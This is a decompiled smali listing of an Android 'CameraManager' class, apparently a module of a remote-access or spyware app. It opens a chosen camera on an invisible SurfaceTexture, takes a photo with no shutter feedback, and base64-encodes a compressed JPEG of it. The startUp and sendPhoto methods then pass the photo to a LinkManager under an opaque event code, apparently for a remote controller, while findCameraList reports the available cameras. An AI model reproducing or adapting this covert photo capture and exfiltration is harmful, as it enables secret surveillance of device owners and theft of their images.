.class public Lcom/piupiupiu/CameraManager;
.super Ljava/lang/Object;
.source "CameraManager.java"


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 27
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 28
    iput-object p1, p0, Lcom/piupiupiu/CameraManager;->context:Landroid/content/Context;

    .line 29
    return-void
.end method

.method static synthetic access$000(Lcom/piupiupiu/CameraManager;)V
    .locals 0
    .param p0, "x0"    # Lcom/piupiupiu/CameraManager;

    .prologue
    .line 21
    invoke-direct {p0}, Lcom/piupiupiu/CameraManager;->releaseCamera()V

    return-void
.end method

.method static synthetic access$100(Lcom/piupiupiu/CameraManager;[B)V
    .locals 0
    .param p0, "x0"    # Lcom/piupiupiu/CameraManager;
    .param p1, "x1"    # [B

    .prologue
    .line 21
    invoke-direct {p0, p1}, Lcom/piupiupiu/CameraManager;->sendPhoto([B)V

    return-void
.end method

.method private releaseCamera()V
    .locals 1

    .prologue
    .line 74
    iget-object v0, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    .line 75
    iget-object v0, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    .line 76
    iget-object v0, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    .line 77
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    .line 79
    :cond_0
    return-void
.end method

.method private sendPhoto([B)V
    .locals 7
    .param p1, "data"    # [B

    .prologue
    .line 57
    const/4 v4, 0x0

    :try_start_0
    array-length v5, p1

    invoke-static {p1, v4, v5}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 58
    .local v0, "bitmap":Landroid/graphics/Bitmap;
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 59
    .local v1, "bos":Ljava/io/ByteArrayOutputStream;
    sget-object v4, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v5, 0x14

    invoke-virtual {v0, v4, v5, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 60
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 61
    .local v3, "object":Lorg/json/JSONObject;
    const-string v4, "image"

    const/4 v5, 0x1

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 63
    const-string v4, "buffer"

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v5, v6}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 64
    invoke-static {}, Lcom/piupiupiu/LinkManager;->getInstance()Lcom/piupiupiu/LinkManager;

    move-result-object v4

    const-string v5, "k7f2qa"

    invoke-virtual {v4, v5, v3}, Lcom/piupiupiu/LinkManager;->send(Ljava/lang/String;Ljava/lang/Object;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 71
    .end local v0    # "bitmap":Landroid/graphics/Bitmap;
    .end local v1    # "bos":Ljava/io/ByteArrayOutputStream;
    .end local v3    # "object":Lorg/json/JSONObject;
    :goto_0
    return-void

    .line 67
    :catch_0
    move-exception v2

    .line 68
    .local v2, "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public findCameraList()Lorg/json/JSONObject;
    .locals 11

    .prologue
    const/4 v7, 0x0

    const/4 v10, 0x1

    .line 83
    iget-object v8, p0, Lcom/piupiupiu/CameraManager;->context:Landroid/content/Context;

    invoke-virtual {v8}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v8

    const-string v9, "android.hardware.camera"

    invoke-virtual {v8, v9}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v8

    if-nez v8, :cond_0

    move-object v0, v7

    .line 128
    :goto_0
    return-object v0

    .line 92
    :cond_0
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 93
    .local v0, "cameras":Lorg/json/JSONObject;
    new-instance v5, Lorg/json/JSONArray;

    invoke-direct {v5}, Lorg/json/JSONArray;-><init>()V

    .line 94
    .local v5, "list":Lorg/json/JSONArray;
    const-string v8, "cv"

    const/4 v9, 0x1

    invoke-virtual {v0, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 97
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v6

    .line 98
    .local v6, "numberOfCameras":I
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_1
    if-ge v2, v6, :cond_3

    .line 99
    new-instance v3, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v3}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 100
    .local v3, "info":Landroid/hardware/Camera$CameraInfo;
    invoke-static {v2, v3}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 101
    iget v8, v3, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-ne v8, v10, :cond_1

    .line 102
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 103
    .local v4, "jo":Lorg/json/JSONObject;
    const-string v8, "name"

    const-string v9, "Front"

    invoke-virtual {v4, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 104
    const-string v8, "id"

    invoke-virtual {v4, v8, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 105
    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 98
    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    .line 107
    .end local v4    # "jo":Lorg/json/JSONObject;
    :cond_1
    iget v8, v3, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-nez v8, :cond_2

    .line 108
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 109
    .restart local v4    # "jo":Lorg/json/JSONObject;
    const-string v8, "name"

    const-string v9, "Back"

    invoke-virtual {v4, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 110
    const-string v8, "id"

    invoke-virtual {v4, v8, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 111
    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    .line 124
    .end local v0    # "cameras":Lorg/json/JSONObject;
    .end local v2    # "i":I
    .end local v3    # "info":Landroid/hardware/Camera$CameraInfo;
    .end local v4    # "jo":Lorg/json/JSONObject;
    .end local v5    # "list":Lorg/json/JSONArray;
    .end local v6    # "numberOfCameras":I
    :catch_0
    move-exception v1

    .line 125
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    move-object v0, v7

    .line 128
    goto :goto_0

    .line 114
    .end local v1    # "e":Lorg/json/JSONException;
    .restart local v0    # "cameras":Lorg/json/JSONObject;
    .restart local v2    # "i":I
    .restart local v3    # "info":Landroid/hardware/Camera$CameraInfo;
    .restart local v5    # "list":Lorg/json/JSONArray;
    .restart local v6    # "numberOfCameras":I
    :cond_2
    :try_start_1
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 115
    .restart local v4    # "jo":Lorg/json/JSONObject;
    const-string v8, "name"

    const-string v9, "Other"

    invoke-virtual {v4, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 116
    const-string v8, "id"

    invoke-virtual {v4, v8, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 117
    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    goto :goto_2

    .line 121
    .end local v3    # "info":Landroid/hardware/Camera$CameraInfo;
    .end local v4    # "jo":Lorg/json/JSONObject;
    :cond_3
    const-string v8, "list"

    invoke-virtual {v0, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0
.end method

.method public startUp(I)V
    .locals 6
    .param p1, "cameraID"    # I

    .prologue
    const/4 v5, 0x0

    .line 33
    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v2

    iput-object v2, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    .line 34
    iget-object v2, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v1

    .line 35
    .local v1, "parameters":Landroid/hardware/Camera$Parameters;
    iget-object v2, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v2, v1}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 37
    :try_start_0
    iget-object v2, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v3, Landroid/graphics/SurfaceTexture;

    const/4 v4, 0x0

    invoke-direct {v3, v4}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {v2, v3}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 38
    iget-object v2, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->startPreview()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 43
    :goto_0
    iget-object v2, p0, Lcom/piupiupiu/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v3, Lcom/piupiupiu/CameraManager$1;

    invoke-direct {v3, p0}, Lcom/piupiupiu/CameraManager$1;-><init>(Lcom/piupiupiu/CameraManager;)V

    invoke-virtual {v2, v5, v5, v3}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 50
    return-void

    .line 39
    :catch_0
    move-exception v0

    .line 40
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method
